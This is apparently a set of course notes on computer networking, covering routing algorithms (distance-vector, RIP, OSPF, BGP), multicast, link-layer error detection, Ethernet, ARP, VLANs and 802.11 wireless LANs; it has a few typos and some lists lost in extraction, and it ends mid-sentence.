Unlike the link-state algorithm, the distance-vector algorithm keeps track of first hops rather than last hops.Anytime a node initializes or updates its distance vector, it sends a copy to each of its neighbors.Eventually, no node will experience any changes to its distance vector and therefore will
not send any updates to its neighbors. The algorithm has converged.If a link to a node fails at some point, a neighbor will mark the cost of that link as infinite.
As long as alternate paths exist, the algorithm will converge and use alternate paths.
However, consider (for example) a case where there is only a single link to node C from B.
Node A tells its neighbors that it can route to C (by going through B). If the link between
C and B fails, node B., using A’s information about the route, will attempt to use A as an alternate route, not realizing that the attempted route will be
B → A → B → C. This will result in an infinite sequence of distance
vector updates between B and A, each advertising a progressively higher cost as they
factor an additional link cost between the AB link each time. This is known as the
count-to-infinity problem.A technique called poison reverse tries to mitigate this problem. Since A knows that
it needs to route through B to get to C, whenever A sends its distance vector to
B, it will set any costs whose first hop is B to infinity. This will avoid creating
a routing loop.An autonomous system (AS) is a collection of routers and hosts that are administered together
and expose a single routing policy to other systems on the Internet.
ASes provide a two-level routing hierarchy in the Internet. Organizations manage their own
infrastructure and expose only limited connectivity to others.
Each AS comprises one or more subnetworks and
serves one or more ranges of IP addresses. It advertises the set of IP prefixes that
it can route (via CIDR and route aggregation to minimize the length of the list). The AS is responsible
for the routing of traffic within its AS, whether it is routing it to another AS or to a machine within its own AS.
The Internet can be viewed as a set of connected ASes, with packets being sent from one AS, possibly
routed through other ASes, and delivered to a target AS.
Routing on the Internet takes place between ASes. Using ASes simplifies the problem of dealing with
the billion hosts on the Internet. An Intra-AS routing protocol, called an Interior Gateway Protocol (IGP) runs
within an AS. It is up to the system administrator to pick a protocol (e.g., an LS or DV algorithm)
and manage the
routes between machines within the AS. The outside world does not see the routes within an AS.
Some Intra-AS routing protocols are RIP and OSPF.Gateway routers are routers within an AS that connect to other ASes and forward packets between them.
In addition to running an intra-AS routing protocol with other routers inside the AS, they
are also responsible for routing to destinations outside the AS by sending datagrams to
other gateway routers.
An Inter-AS routing protocol, called an Exterior Gateway Protocol (EGP) runs on
gateway routers and enables
them to learn of routes to addresses served by other ASes or routed by the gateway routers within that AS.Logically, an external AS looks like a router. An AS will be
connected to some other ASes and needs to learn
which destinations are reachable via those ASes.
Some of those ASes may need to relay the datagram in order to send it onto other ASes.
If a desired subnet can be accessed through either of several ASes (that is, either of those ASes can
route to that subnet, not that the subnet belongs to multiple ASes), then a common approach is to
have the AS send the packet out onto another AS in the least-cost manner. This is called hot-potato
routing. The goal is to find the lowest cost path to any gateway router that can then route to some
AS that can deliver the packet.
Since ASes are owned by different organizations, everyone on the Internet must agree to use the same
inter-AS routing protocol. Currently, this protocol is BGP version 4. Each Autonomous System is assigned a unique ID by a Regional Internet Registry (the same
organization that assigns blocks of IP addresses). Policies defined by the owner of the AS
determine if the AS will route traffic to other ASes and, if it will, whose traffic it will route.A Transit Autonomous System is an AS that provides the ability to route traffic from
one AS to another AS.
A Tier 1 ISP represents a transit autonomous AS (or set of ASes) that does not pay any other network for
transit. It peers (and connects directly) with every other Tier 1 network so it can route an
IP address directly to the Tier 1 network that oversees it.A Transit relationship on the Internet is considered to be one where an AS sells access to the Internet.
That is, it agrees to act as a router between ASes but traffic is metered and charged.
A peering relationship is one where a pair of ASes agrees to exchange traffic with each other
for no cost.
A Tier 2 ISP is an AS (or set of ASes) that needs to purchase Transit to connect to some
parts of the Internet. Establishing a peering relationship avoids the need to purchase Transit.A stub Autonomous System is an AS that is connected only to one other AS (run by an ISP).
Because it is connected to just one AS, it cannot provide transit. A multi-homed stub
Autonomous System is an AS that is connected to multiple ASes (e.g., multiple ISPs) but will
not offer routing services between them.The Routing Information Protocol (RIP) is an Intra-AS IP routing protocol
(interior gateway protocol) that uses
a form of the Distance-Vector algorithm. It counts only hops, so the cost of each link is one.
RIP creates and manages a routing table on a router. For each destination (a subnet: a group of IP
addresses), the table contains the number of hops to that destination and the address of the next router (the first hop).As with the DV algorithm, each router sends periodic RIP advertisements to its
neighbors. A RIP
advertisement is just the routing table with hop counts. When another router receives such an
advertisement, it compares the routes in the received table to see if routing that
that node will result in fewer hops. If so, it will update its own routing table. It will
also add any new subnets that it obtains from received tables.Open Shortest Path First (OSPF) is another interior gateway protocol that was designed
as a successor to RIP. It is a link-state algorithm based on Dijkstra’s shortest path algorithm.
Because of this, every router constructs a complete graph of the systems in the AS.
Any link changes are broadcast to all routers, not just a node’s neighbors.To support larger networks, OSPF allows the network in an AS to be partitioned into multiple
OSPF Areas. Each area runs its own OSPF link-state algorithm and routes any packets that
are destined to go out-of-area to an area border router (ABR). The collection of these
area border routers belong to a common backbone area. They summarize (aggregate)
routes to the subnetworks in their own area and advertise them to other area border routers.
Area border routers also run the OSPF algorithm not just to learn routes within its
area but also to ensure that each ABR
can route to the proper ABR in another area based on a prefix match of the destination IP address.
OSPF Areas make a single AS look like a mini Internet.Unlike RIP and OSPF, the Border Gateway Protocol (BGP) is an exterior gateway protocol:
an inter-AS routing protocol.
Gateway routers in an AS establish a TCP connection with gateway routers in other ASes.
A pair of such routers are known as BGP peers and the TCP connection between them is known
as an external BGP session (eBGP).
In cases where an AS has more than one gateway router, other routers need to know which
IP address prefixes are served by which gateway.
Internal BGP sessions (iBGP) between a gateway router
and other routers within the AS allow the gateway router to propagate information about
external IP prefixes that it can reach. Typically, iBGP will run between the gateway
router and the area border routers (ABRs) in an OSPF backbone area.BGP peers exchange CIDR route prefixes and use a distance vector (DV) algorithm to establish least-cost paths.
A gateway router advertises its prefix reachability, which means it
tells its peers in neighboring ASes the routes that it is capable of handling (as CIDR prefixes).
In this manner, each AS finds out which neighboring AS yields the lowest-cost path to a
destination. Each BGP advertisement identifies a route, which consists of:An important facet of BGP is its use of policies. An import policy defines
what routes an gateway router will reject. Policies are designed by an administrator and
can set local preferences and policies such as not offering transit to certain ASes.A unicast is a point-to-point transmission. The communications we looked at to date
were unicast messages: a node sends a message to a unique destination.
A broadcast is a message that is received by everyone on a network.
We encountered this when we examined IP addresses. An IP address with
all bits set to 1 is a limited broadcast address where the datagram is
delivered to all nodes on the local area network but not forwarded by routers.
A directed broadcast address where only host bits are set to 1
(the low-order bits that make up the host, as opposed to the network bits)
delivers a datagram to all hosts on the specified subnet. Routers must
may forward the datagram to that subnetwork.A multicast is a message that is delivered to all members of a group.
That is, it is delivered to all hosts that have subscribed to receive
the multicast.
These group members do not all have to reside on the same local area network.
A simple way of implementing a multicast is by an n-way
unicast. The sending host simply iterates over the list of destinations
and sends a datagram to each destination. This is inefficient since the sender must
transmit
N times the traffic. Moreover, the sender needs to know all of the
recipients.It is more efficient – and desirable – to have routers replicate packets.
With uncontrolled flooding, a host sends
a single datagram that is then replicated by each router and sent over every
other interface in that router. The problem with this approach is that
any cycles in the graph formed by router connections will create a broadcast storm: a router
will have receive a duplicate datagram, send it
out on each interface, receive one or more of those duplicates at a later time,
duplicate and send that, and so on.A controlled flooding approach ensures that these cycles do
not occur. Sequence number controlled flooding requires each
multicast packet to have a sequence number affixed to it.
Each router keeps track of the sequence numbers of datagrams that it has
recently routed. If it receives a datagram with a new sequence number,
the router sends a copy over each link except the one it came in on.
If the router
gets a packet with a sequence number that it has already seen,
it discards the packet. Reverse path forwarding (RPF) is a
technique that does not require adding new data to a
packet. When a router receives a datagram, it looks at the
datagram’s source address and then consults its routing table
to see whether the datagram arrived on the link that
corresponds to the route to the source (which will be the
shortest path to the source). If it does, then the router
forwards a copy of the packet onto every other link. If it does not,
that indicates that the packet is a duplicate that arrived through
a cycle. That packet is discarded. A multicast based on controlled flooding
using RPF is called a source-based tree: the flow of multicast
packets forms a tree that is rooted at the initial sender.
With a source-based
tree, each sender establishes a separate shortest-path tree for a multicast group.
Since RPF is used, routers have to keep track of the sender of the multicast packet.Another approach to controlled flooding is not to send a copy
of the datagram onto every link in the router. Instead, we create
an overlay network that is a subset of the full network.
This overlay network is a spanning tree, which
is a graph that contains all the nodes of the network but
only a subset of the edges such that the graph is connected
(all nodes are reachable) but there are no cycles.One way of constructing a spanning tree is to pick a random node
to serve as a rendezvous point (also known as a center node).
Every node that wants to receive multicasts will send a join
message to that rendezvous point. As each join message propagates
through routers, each router records the incoming and outgoing
interfaces as being associated with that multicast address. The
incoming and outgoing links become part of the spanning tree.
When all interested nodes have sent join messages, the
spanning tree is complete. Any multicast messages will be forwarded
only along the links that make up the spanning tree. This multicasting
technique is called a group-shared tree since only interested
edge routers beome part of the tree.
With a group-shared tree, a single tree is shared among all senders
for a multicast group; each sender has to send its multicast packets to a common
rendezvous point in the exact same manner as if it was sending unicast messages.
Unlike a source-based tree, routers do not need to make routing decisions based
on the sender’s address for a multicast destination.IP multicast is designed, like IP, to be decentralized and span multiple physical networks.
Membership is dynamic: a machine can join or leave a multicast group at any time.
There is no central coordinator and no restriction on the number
of hosts that can be in a group. Multicasting provides network efficiency.
Datagrams in a multicast stream only need to be replicated when a router needs
to send them to multiple network links. A sender transmits only a single
stream of datagrams and only one stream of datagrams is ever needed
on any network segment regardless of the number of receivers.An IP multicast address (also known as a class D address) is
an IP address that starts with the bit pattern 1110 and
contains a 28-bit multicast group ID.
With IPv6, a multicast group address starts with the bit pattern of eight 1s (1111 1111)
and contains a 112-bit multicast group ID (the other buts are used for flags and to indicate scope;
we will not cover that here).
A host may join any IP multicast address and receive messages addressed to that multicast ID.
The collection of systems that are interested in receiving multicast messages from a specific multicast group is called a host group.Routers have to get involved to support multicasting beyond the local area network.
Two protocols are used to implement multicasting.
The Internet Group Management Protocol
(IGMP) is designed for hosts to inform routers that
they are interested in joining a multicast group.
The Protocol Independent Multicast (PIM)
protocol enables routers to tell their neighboring routers that they
are, or no longer are, interested in receiving packets for a particular
multicast group.A host uses IGMP to send a
multicast report message to join a specific multicast group. A multicast-aware
router will get this message and now know that the link on which
the message arrived needs to receive any packets addressed to that multicast
group. Periodically, a router will send a membership query, asking hosts
what multicast groups they want to receive. If no host on a network link
responds, the router will assume that nobody on that LAN is interested in
receiving multicast packets. If a host is interested, it has to re-send
a multicast report. This technique of requiring renewals and deleting
a subscription if no renewal is received is called soft state. A
host may send an explicit leave group message to state that it is
no longer interested but the soft state mechanism ensures that multicasts
will not be sent onto the network even if that does not take place (if the
machine dies, for example).IGMP allows routers to know what multicast groups the nodes on its connected LANs are interested in.
PIM, Protocol Independent Multicast, is responsible for conveying membership information
among routers. It assumes the presence of other protocols to know the network topology and which
routers are connected together. There are two approaches to multicasting on the WAN (wide-area
network): flooding and sparse-mode multicast.Flooding, also known as Dense Mode Multicast, uses a source-based tree. That is, all multicast traffic
originates from the source and the message is duplicated at a router and sent to all of its connected routers.
Each of those routers,
in turn, duplicates and sends the message to all of its connected routers, and so on. Reverse
path forwarding (RPF) is used to ensure that no forwarding cycles arise.
PIM Dense Mode floods the entire network of connected multicast-aware routers. A router
stops forwarding traffic only when it receives a Prune message from a router telling it
that the router does not want the multicast traffic for that address.
It does this if its downstream routers are not interested in that multicast stream.
If a node on a LAN joins a multicast group at a later time and sends an IGMP message to a
router, that router would then send a PIM Graft message to its connected routers
to state interest in the stream.
Dense mode only makes sense when there are interested receivers spread through most locations covered
my multicast-aware routers. It is rarely used.In contradistinction to Dense Mode, PIM Sparse Mode Multicast starts with requests
from multicast receivers rather than flooding the network with traffic from the sender.
Each multicast group must be associated with a router known as a rendezvous point.
Edge routers that are interested in receiving a multicast group send join messages
to that rendezvous point. This builds a spanning tree between the rendezvous point
and the subscribers.
This rendezvous point acts as a
central point that senders route to when they are transmitting
multicast streams.
The advantage of PIM sparse mode multicast is that packets go only where needed.The data link layer is concerned with sending and receiving data on the actual communication
links that connect machines. These are the links that constitute a local area network (LAN).
Packets at the data link layer are called frames. Medium Access Control (MAC) is
the general term for the protocol that is used for transmitting and receiving link-layer frames.
Interfaces at the link layer use link-layer addressing. A MAC address (for example, an
Ethernet address) is different from, and unrelated to, an IP address. An Ethernet MAC address
is globally unique to a device and there is no expected grouping of such addresses within
a local area network. IP addresses on a LAN, on the other hand, will share a common network prefix.MAC protocols usually employ error detection codes and sometimes employ error detection and
correction codes. We’ve seen that IP used error detection codes to validate an IP header
and both TCP and UDP used them to validate their headers and data. Why do we need this at the link layer?
The basic advantage of detecting errors at the link layer is to catch bad frames early and avoid
the overhead of propagating a useless frame up the network stack. If the firmware on a network
card can detect an error, it can drop the packet and not even waste time interrupting the processor.
If error correcting codes are used, the link layer now has the opportunity to correct a limited
amount of bit errors in the received frame. This can avoid the costly delay of having to retransmit
a packet.The simplest form of error detection is parity. With parity, we add one bit to a block of data, called
a parity bit.
With even parity the parity bit is set such that the total number of one bits in the
block of data (including parity) is an even number.
With odd parity the parity bit is set such that the total number of ones is an odd number.
Parity is simple to compute and requires a low overhead both in terms of storage and computation.
However, it cannot detect an even number of bit errors (one error cancels the other). Moreover,
in networks, bit errors typically occur in bursts, not single bits, so parity is a poor choice
for this kind of application. Parity is popular in applications where errors rarely happen and,
when they do, are usually single-bit errors. Memory chips are an example where parity codes are
useful.The use of parity is based on the assumption that errors are rare and multi-bit errors are even more rare.
We can arrange a sequence of bits into a two-dimensional M × N array. Then we generate a parity bit for each row
and another one for each column. Finally, we generate a parity bit for the intersection of the row and column
parity bits. To validate data, we check the parity along each row and each column. If there is a single bit error in
the data, the intersection of the row and column with parity errors will identify the bad bit. Two-dimensional parity, which can be easily extended to n dimensions, is a simple example of
an error correcting code (ECC). Error correcting codes were pioneered by Richard Hamming
in 1950 and there are numerous such codes, multi-dimensional parity being one of the simplest.
A data transmission that uses error correcting codes is said to use forward error correction (FEC).A checksum is any form of code that is uses the data to compute a small, fixed-size value that
is sent along with the data and is used for error checking. The receiver can apply the same computation
to validate the checksum. Any bit errors in the data will yield a high probability that the computed
checksum will be a different value.
We already examined a simple checksum earlier. Protocols such as IP, UDP, TCP, ICMP, OSPF,
and IGMP all use the Internet checksum. In this checksum, we summed up the data 16 bits
at a time, adding one whenever the sum of two values resulted in a carry (overflow), and inverting the
bits of the result. The Internet checksum is extremely easy to compute put provides
poor detection of errors in the data. A cyclic redundancy check (CRC) is a much more robust checksum that is particularly good
at detecting multiple consecutive bad bits. An n bit CRC code will generally detect a burst of
up to n bad bits.
CRC codes are a type of code known as a linear block code. A block code treats the data
as a sequence of fixed-length integers. The Internet checksum is also a form of a block code.
A CRC is a bit more computationally intensive to compute than
an Internet checksum but, when done at the MAC layer, is generally done by the hardware of the
adapter, and therefore does not take time from the processor.A CRC computation is similar to long division but with the use of exclusive-ors instead of
subtraction.
The entire data to be checksummed is treated as a large binary number that is
left-shifted by the desired length of the CRC code (e.g., r bits).
This number is “divided” by a value called the generator (abbreviated by G).
The generator is pre-defined and agreed to by both sides.
For an r-bit CRC code, the generator must be r + 1 bits long,
start with a 1 and be an odd number (end with a 1).
The “division” is a series of exclusive-ors on the data, aligning G
with the leftmost 1 in the remaining data, exclusive-oring the result,
and repeating until there is no more room to position r bits under
the data. What’s left is the remainder, which is the CRC value.The figure on the right shows a CRC computation with a Generator of 23
(10111) yielding a remainder of 11 (1011), which becomes the checksum.
The data is sent with the CRC number in place of the 0 bits that filled
the data on the right when we left shifted the data by r bits.
The recipient performs the same division without left shifting the value it receives.
If the remainder is 0, then this indicates that there is no data
corruption.A multiple access protocol is MAC protocol that is used on a network
where multiple hosts need to send messages on the same physical link (e.g.,
the same wire or range of radio frequencies). These types of links are
broadcast links since multiple hosts are connected to the same medium.
The multiple access problem is that of coordinating transmissions
from multiple hosts to avoid collisions. A collision is when
two or more hosts transmit at the same time on the same frequency,
causing one transmission to interfere with the other, and damaging both
signals. There are three strategies for handling this.Channel partitioning means dividing a communication channel either
into fixed time slots or fixed frequency bands. Time division multiplexing
(TDM) divides a channel into time slots. For n hosts, each host
gets 1/ n of the time slots. A host can transmit only during its
defined time slot. Frequency division multiplexing (FDM) divides
a channel into n frequency bands. A host can transmit at any time but
can only transmit on its allotted frequency band. As with TDM, this
channel partitioning scheme does not make efficient use of the bandwidth.
Frequency bands or time slots go wasted if the nodes to which they are
allocated have nothing to send.MAC protocols based on taking turns allow each node to have full use
of the network and coordinate access to make sure that no other
node will be using the network. This ensures that collisions cannot
occur.A polling protocol uses a master that polls each of the nodes on
the network, each in turn, to see if one of them wants to transmit
data. This ensures that there are no collisions as the master will
not poll another node until transmission is complete. However,
a node incurs the delay of waiting to be polled (think about a LAN
with thousands of nodes on it). Also, if the master dies, the network
becomes inoperable.A token passing protocol uses a special frame, called a token,
that is passed around the nodes on the network in sequence.
If a node gets a token, then it can transmit data. Once it is done
transmitting, it passes the token to its neighbor. If it has nothing
to transmit, it passes the token to its neighbor immediately.
Unlike a polling protocol, there is no need for a master. However,
it suffers from some of the same problems. A node has to wait for
the token and, should a node fail to pass the token, no other node
will be able to transmit.With random access protocols, any node has full use of the channel
but only one node at a time may use it. There are no scheduled time slots
as in TDM. Because there is no schedule on who can transmit when,
random access protocols have a chance of collision when multiple nodes
decide to transmit at the same time.In the Slotted ALOHA protocol, access to the network is divided into
time slots. Time slots are not assigned to any node.
A node can transmit at the start of any time slot and must finish
transmission at the end of that slot. If two nodes happen to transmit
during the same time slot, a collision results and both nodes will
have to retransmit the frame. Each of them retransmits it in the
next time slot with some predefined probability p. Imagine the decision
is made by a
node flipping a weighted coin to decide whether to retransmit in the
next time slot. If the flip tells it not to retransmit, it makes the
same decision for transmitting on the time slot after that (and so on).
Slotted ALOHA introduced the concept of a randomized wait after
a collision but it does not use the network very efficiently. For
a large number of transmitting nodes, only about 37% of time slots
will have useful data. The rest will be empty or have collisions.Carrier Sense Multiple Access with Collision Detection (CSMA/CD)
is a successor to Slotted ALOHA and is the protocol used on Ethernet on a
shared link (which was the design of the original Ethernet).
CSMA/CD has two parts to it: carrier sensing means that a node
will not just transmit when it is ready to do so but will first listen
to the communication channel and wait until it is clear (i.e., nobody
else is transmitting); collision detection means that a
node is listening to the channel at the same time that it is
transmitting. If it detects interference (a collision), it immediately
stops transmitting.After a node detects a collision and stops transmitting, it will
have to retransmit that frame. Before doing so, it will wait a
random interval. The desired heuristic is to pick a random wait time
from a long time interval if there is a lot of traffic on the network
and to pick a random wait time from a short time interval if there is
little traffic on the network. Of course, a network adapter has no
idea what is going on in the rest of the network. Instead, each
time the transmission of a frame results in a collision,
a random backoff value will be chosen from a time interval that is
double the previous time interval. This technique is called
binary exponential backoff.Ethernet was designed as a random access packet switched network
that uses CSMA/CD over a shared wire. It has been evolving since
the the mid–1970 and continues to evolve. Not only did it get
faster (from 2.74 Mbps to 10 Gbps and beyond) but it moved from
a shared bus topology to a switched star topology, where every
node is connected by a dedicated cable to a central switch.There are slight variations on the format of an Ethernet frame
depending on which version of the protocol is used but the
key parts of an Ethernet frame are:Surprisingly, the frame length is missing in the most common version (Ethernet II)
since the end of the frame is recognized by the hardware when the carrier signal drops.
The packet driver on the adapter counts bytes as they arrive and stops when the
receiver hardware has no more bytes to receive.Ethernet addresses are 48-bit addresses that are globally unique. They
are generally assigned by the manufacturer of the adapter.
These MAC addresses are unrelated to IP addresses. Any IP datagram
needs to be encapsulated in an Ethernet frame before it can be transmitted
on an Ethernet network. The MAC address in this frame is the address of the
next hop for that datagram.
The Address Resolution Protocol (ARP)
allows a host to find a MAC address that corresponds to a desired IP address.If a host needs to send a datagram to a system on its
subnetwork, it must encapsulate the datagram in an Ethernet
frame whose destination address is the MAC address of the recipient.
If a host needs to send a datagram to a system that is not on its
subnetwork, it needs to look up the destination IP address in its routing
table and encapsulate the datagram in an Ethernet
frame whose destination address is the MAC address of the first-hop router that
is responsible for that IP destination.ARP maintains a cache of recently-used IP-MAC address mappings in an
ARP table. If the IP address it needs is not in the table, then
it broadcasts an ARP query that contains the desired IP address.
Every adapter on the LAN will receive it (it’s an Ethernet broadcast).
If one of the adapters owns that IP address, it responds directly to
the sender with an ARP response containing the corresponding MAC address.IPv6 does not support ARP and uses a similar but more efficient mechanism
called the Neighbor Discovery Protocol (NDP). Every IPv6 host must listen to a special
multicast IP address that is derived from its own IP address. The
multicast Ethernet MAC address is, in turn, derived from that IP
multicast address. Hence, a query (called a neighbor solicitation)
will be sent as a multicast message and delivered only to those
hosts whose IP addresses result to the same Ethernet MAC address.
Most likely, there will only be one such address in a LAN. The benefit of
this method over ARP is that
every host on the LAN is not interrupted with a query.As with IP, Ethernet defines a range of MAC addresses that are reserved for use as multicast addresses.
An Ethernet controller may, depending on the hardware, be configured to receive multicast frames in
several ways:The link-layer software driver needs to be prepared to receive extraneous frames and discard them
if they contain destination addresses that the host is not interested in receiving.While IP and Ethernet MAC addresses are completely unrelated on a host,
multicast addresses are related since there would otherwise be no way of identifying
the set of MAC addresses that need to receive a specific IP multicast datagram.
Each host needs to define a multicast MAC address that can be derived from the IP address
so that each receiver can listen on that address and each transmitter can transmit to that address.
Both IPv4 and IPv6 use a similar approach. A number of least-significant bits of the
IP multicast address (23 out of 28 bits for IPv4; 32 out of 112 bits for IPv6)
are copied onto a defined MAC multicast address. The IP driver will need to discard
any extraneous multicast packets that arrive because the lower bits of the multicast
address happened to be the same.Ethernet began as a shared network using a bus topology.
As coaxial cables gave way to twisted pair wiring (phone wires), adapters on
different hosts could no longer tap into the same cable. Ethernet moved
to a star topology where a separate cable connected each adapter to a
central point: an Ethernet hub.
An Ethernet hub simulated a shared Ethernet network by taking every bit
that was received on one interface and transmitting it onto every other interface.Hubs evolved into switches. While switches look similar to hubs, they
are more intelligent and improve the performance of Ethernet networks
considerably. A switch essentially acts like a link-layer router.
It forwards frames received on one interface (connector) to another.
Unlike a router, a switch is self-learning. It learns which MAC addresses
correspond to which interfaces on the switch by looking at the
source address of frames that arrive on each interface. This mapping of
MAC addresses to interfaces is stored in a forwarding table (also called
a switch table or a MAC table).
Because switches may be connected to each other, multiple MAC addresses
may map to a single interface on a switch (that interface happens to connect
to another switch). If a switch receives a frame with a destination
address that is missing from its table, it simply sends a copy of that frame out onto all
interfaces.The biggest benefit from switches is that collisions can no longer occur.
A link between a switch and a host is full duplex: frames can be
sent concurrently with frames being received. The switch itself will
queue and forward frames (this leads to the possibility of buffer overflow, but not collision).
Adapters operating in full duplex mode have no need to do collision detection.Some Ethernet switches can be configured to act as multiple logical, or virtual, switches,
thereby creating several distinct local area networks.
These networks are called Virtual Local Area Networks (VLANs) and they look and feel like
distinct LANs.
Each interface on the switch can be assigned, or reassigned, to one of these VLANs.
Operations such as broadcasts and link-layer multicasts will remain within
a single VLAN.VLANs can be extended geographically or in capacity by connecting multiple
switches together. Instead of running a cable for each VLAN between the switches, a single
cable may be used to connect the switches to handle all the traffic that flows on all of
the VLANs. This is called VLAN trunking. To identify which VLAN an Ethernet frame
belongs to, the Ethernet frame is augmented with a VLAN tag. This tag is removed
when the frame is switched to a non-trunk interface.With VLAN switches, an administrator can define which VLAN any device resides on, regardless of
which switch it is connected to. This allows the administrator to segment groups of computers
(e.g., accounting vs. development vs. test) without having to connect each group to its own
dedicated switch.A base station is a device that sends and receives data to and from wireless hosts.
It may also coordinate transmission among hosts, with directives on who can transmit,
when, and what signal strength. The base station generally interfaces to other, usually wired,
networks thereby connecting the wireless devices with the wider Internet. Examples
of base stations are cell towers and wireless access points.A wireless device, called a station may operate in infrastructure mode, in which case traditional
network services such as DHCP, DNS, and routing as well as connectivity to the Internet
are expected to be provided through the base station and the wired network to which it connects.
Alternatively, hosts may operate in ad hoc mode, also known as peer-to-peer mode.
In this case, there is no base station or back-end infrastructure available.
Hosts are self-configuring and need to figure out how to communicate among themselves, which includes
assigning unique addresses, discovering names, and deducing routes to each other.802.11, also known as Wi-Fi, is a set of standards for wireless local area networking.
Standards such as 802.11a, 802.11b, 802.11g, 802.11n, and 802.11ac define operating frequencies and
data encoding techniques used for sending and receiving frames on a wireless LAN. Most
802.11 systems operate in either the 2.4 or 5 GHz frequency bands. An 802.11 base station is known as an access point (AP). The collection of an access point
and one or more mobile wireless devices (stations) is called a basic service set (BSS).
Each BSS has a unique ID, called the BSSID, which happens to be the MAC address of the
BSS’s access point. Devices that interact with an access point operate in infrastructure mode.
The access point connects to a wired Ethernet infrastructure. 802.11 devices can also operate
in ad hoc mode, where devices communicate directly with each other with no need of an access point.Each access point, in addition to having a BSSID, has a Service Set Identifier (SSID), which is
a human-friendly text name that is assigned by the administrator who configures the AP. Each BSS operates
over a range of frequencies identified as a channel. Adjacent channels partly overlap with each other.
For example, in the U.S., the allowable non-overlapping channels in the 2.4 GHz band
are 1, 6, and 11.
If adjacent BSSes use these
distinct channels, then frames sent by a device in one BSS will never interfere with those in another BSS.A station (a wireless endpoint device)
needs to find and associate itself with an AP. Two techniques are available for this.
With passive scanning, the AP periodically sends beacon frames, each containing the AP’s
SSID and MAC address (BSSID). The beacon is typically sent every 100 ms.
The station scans all channels, searching for beacon frames
from any APs in the area.With active scanning, a station may broadcast a probe request frame.
It sends this to a broadcast address (ff:ff:ff:ff:ff:ff) and sets a timer to wait for
any answers. If no answer has been received at the end of the time period, the
station moves to the next channel and repeats the process.
APs that receive the probe will respond with a probe response frame, that contains their identity,
supported data rates, and other information. A station then selects an access point with
which to associate. This may be done by the user or programmatically (e.g., the AP with the strongest
signal or one that has been seen in the past). The station sends an association request frame,
receives an association response from the AP and is now part of that AP’s BSS. It can
then send a DHCP discovery message to configure itself on the IP network.There are a couple of fundamental differences between 802.11 and Ethernet, apart from one
being wireless and the other being wired. Operating in a wired medium results in
considerably higher bit-error rates. Also, while an Ethernet transceiver, when operating on a shared
medium, can listen while transmitting, an 802.11 transceiver cannot. Because of this,
Ethernet was able to perform collision detection and stop transmitting the instant that
it detected a collision. 802.11 cannot do so and will transmit a complete frame, even
if it gets garbled in the air.To deal with the inability to detect collisions, 802.11 employs a random access MAC protocol called
carrier sense multiple access with collision avoidance (CSMA/CA). The key
part of CSMA/CA is that, if stations sense a busy channel, they all perform a
random backoff and then try again.
Collisions are likely to occur if multiple stations wait for a busy channel to become clear
and then start to transmit at the same time. To avoid this situation, CSMA/CA tells the stations to wait a random time
after they sensed a busy channel became clear, and then transmit the frame.
The random time counter counts down only when the channel is sensed to be clear;
it pauses whenever a signal is detected on the channel.
The idea is that stations pick different random values and
when they are ready to try transmitting again, they will not transmit at the same time:
somebody will end up going first, causing the channel
to be busy for others.Since 802.11 cannot listen while transmitting to detect a collision and because
there is a higher likelihood of data corruption on a wireless network,
802.11 adds an ARQ protocol (acknowledgements and retransmissions).
After a node sends a frame, the receiver (AP or station) validates the CRC in the
frame and sends back an acknowledgement frame. If the sender does not receive the
acknowledgement, it increases its backoff value, counts down a random interval
for the channel to be free to transmit, and retransmits the frame.
Like CSMA/CD, 802.11’s CSMA/CA uses binary exponential backoff.
Because 802.11 uses an ARQ protocol, the 802.11 frame contains a sequence
number to allow a receiver to detect duplicate frames.
After a certain number of retransmissions, the sender gives up, so reliable delivery
is not assured.Because of the higher likelihood of errors and the time expense of retransmission, 802.11n
and 802.11ac systems also support the optional use of an error correcting code
(low-density parity check code, LDPC).
This is in addition to the CRC error-detection code.A unique problem in wireless networks is that a station does not necessarily
know if a channel is busy or not because it can be out of radio range of
another station that is transmitting while both stations are in range of
an access point. This is called the hidden node problem. In this case,
a station may transmit when it thinks the channel is clear, not realizing
that a transmission was already taking place between the AP and another
station. This is unavoidable but is ameliorated via the optional use
of RTS/CTS (Request to Send / Clear to Send).
Before transmitting a frame, a station sends a Request to Send (RTS)
message to the AP, asking to reserve the communication channel for
a message of a specific size. The AP then responds with a
Clear to Send (CTS) message, giving it permission to send
the frame. The CTS message is broadcast so that all stations will
get the message and know that they should not transmit anything during
that interval. RTS and CTS frames are short and sending them reduces
the chance of collision compared to sending a long data frame. The
RTS/CTS mechanism serves as an extension of carrier sensing. It allows
a station to be informed that a channel will be busy even if it may not
have the ability to pick up the signal from the station that will be
transmitting the data.The 802.11 frame is conceptually similar to an Ethernet frame. In fact,
they share the same MAC addressing scheme so that Ethernet addresses interoperate
with 802.11 addresses. The access point serves as a bridge between the two
protocols and converts 802.11 frames into Ethernet frames when they need
to go on an Ethernet link and vice versa.
One distinction between Ethernet and 802.11 frames is that an 802.11 frame
has four address fields, three of which are used in infrastructure mode.
One address identifies the wireless destination. Another identifies the
wireless source. In cases where the frame is routed between the wireless
and wired network, the third address identifies the MAC address of the
wired device (regardless of whether it is a sender or a receiver).
The reason for three addresses is that, unlike an Ethernet switch,
an AP has a distinct MAC address and is addressed as an intermediate destination
both for frames between wireless stations and for frames that go between
and devices on the wired network. If a frame needs to go to the wired network,
a station will address it to the AP, which will then create an Ethernet MAC
frame that is addressed to the targeted wired destination.A station is part of a BSS. That means it is associated with a single access point.
To extend the range of a wireless LAN, multiple access points may be deployed
that share the same SSID. A device can dissociate itself from one AP and
associate itself with another one when it detects a stronger signal from the
new one. This is called host migration.
Since the APs are connected to the same LAN via the same switch (or
a set of connected switches), there is no problem with the station keeping
the same IP address and any state of TCP session. The challenge is to
get the Ethernet switch to immediately route frames to the latest access point
that the station has joined. To support host migration at the switch,
an access point broadcasts an Ethernet frame that contains the migrated
host’s source MAC address. The switch, being self-learning will immediately
update its forwarding table, associating the device’s MAC address with
that of the interface on which it arrived.Most wireless devices are battery powered and power consumption is a
key design factor. A transceiver on a wireless device can quickly
go to sleep and wake up at a preset interval. Before a device
puts its 802.11 transceiver to sleep, it sends a message to the AP
stating that it is going to sleep (this is a bit in the MAC header).
Upon receiving this message, the AP will queue but not send any
frames targeted for that device. The device’s transceiver is programmed
to wake up before the AP is scheduled to send its next beacon frame
(which the AP does typically every 100ms). When the AP sends a
beacon frame, it sends a list of MAC addresses of stations that
have buffered frames (queued frames). The station will then
wake up and request the frames via a polling message. Otherwise,
it can go to sleep until the next beacon.IP was designed as
a system that would provide best-effort packet delivery but with no guarantees
on the path a packet will take, whether it gets dropped, or what order it
arrives in. Hence, there is no concept of delivering any specific grade of service.
As IP networks began to be used for carrying continuous
media, such as voice and data,
